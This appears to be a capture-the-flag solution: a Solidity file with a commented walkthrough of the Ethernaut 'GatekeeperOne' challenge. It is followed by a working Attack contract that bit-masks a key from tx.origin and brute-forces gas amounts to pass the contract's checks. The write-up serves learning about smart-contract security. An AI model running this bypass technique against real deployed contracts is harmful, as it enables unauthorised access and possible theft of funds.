/*
    Well this is quite a hard one, it's a damn pain in the ass but finally we got the fucking answer to this solution, got a much to learn and so you do..

    Bit of a topics you really need to know for understanding this stuff:
        - Bit masking
        - tx.origin Vs msg.sender
        - opcode (just a lil bit, like they cost gas and how to seek them in remix)
        - what is gasleft()
    But anyways some of them will be cleared on the go

    Let's Shoot up then!!

    There are three gates which we need to break in and call `enter` function to succeed

    GateOne - This just consists of a check that tx.origin shouldn't be equal to msg.sender. And is really easy to break by calling the 'enter' function with the help of contract...

    GateTwo - This gonna use up some brute force techniques, mainly using gasleft() in a way such that we meet the required condition. Basically speaking, every contract uses up some gas, if we manually able to seek how much gas gonna be used up and pass a particular amount of desired gas to make this contract work, then it be able to break up the gate two. (Some details be near the actual scenario!!)

    GateThree - Need a thorough understanding of conversion between uint and bytes, bit masking and some other math stuff, but let's begin 
    So, our key is hidden on the line third of this modifier, it is

    // require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    As you can see, we just need our tx.origin which be our wallet address, and find it's uint16 value and so on, let's just work on it

    my wallet address is -> 0x9aFE8fCbc8465b73319520AFEDba0C0179f26D97, which is kind of 20 bytes..make sure that each byte covers up '2' digits
    cutting this wallet address to 8 bytes, we get

    key -> 0x9aFE8fCbc8465b73, this key is of bytes8 <=> uint64

    let's dive into the details with each line
    // 1 - uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
           This requires our key such that if it is converted into uint16 and uint32 it be same..
           So, it be something like 0x0000FFFF = 0xFFFF
                                    (uint32)     (uint16)

       2 - uint32(uint64(_gateKey)) != uint64(_gateKey)
           This just makes us clear that uint32 key format shouldn't be equal to 64, which results in..
           0x0000FFFF != 0xFFFFFFFF0000FFFF, now you can't discard the left side bits from 0

       3 - this is line is already referred to, just a recheck of line 1, it's main use was to give us hint about tx.origin

    Summing up -

    key ->  0x9aFE8fCbc8465b73
                    &
    mask -> 0xFFFFFFFF0000FFFF, why is that? => to just make our key pass to all three conditions
                'equals'
    new ->  0x9aFE8fCb00005b73, here 'F' represents kind of 1, and 'F & 8 -> 8'
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/math/SafeMath.sol";

interface GateKeeperOne{
    function enter(bytes8) external returns(bool);
}

contract Attack{
    using SafeMath for uint256;

    bytes8 txOrigin16 = bytes8(uint64(uint160(tx.origin)));

    // Here we used bit masking to make it pass through Gate 3
    bytes8 gateKey = txOrigin16 & 0xFFFFFFFF0000FFFF;
    GateKeeperOne public keeperOne;

    constructor(address _victim){
        keeperOne = GateKeeperOne(_victim);
    }

    function hack(uint start, uint end) public{
        // Now what's we doing here, just using a brute force technique
        // Here 8191 will be the multiplied by any number greater than 3 such that enough gas is provided for this function to call, and then 150 is added, just to make it more precise for some gasleft context, and then hit and trial thing is done with for loop iterations!!

        // Make sure to try different value of 'start' and 'end' ranging from 0 to 500
        for(uint i = start; i < end; i++){
            (bool result, bytes memory data) = address(keeperOne).call{gas: i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (result){
                break;
            }
        }
    }
}
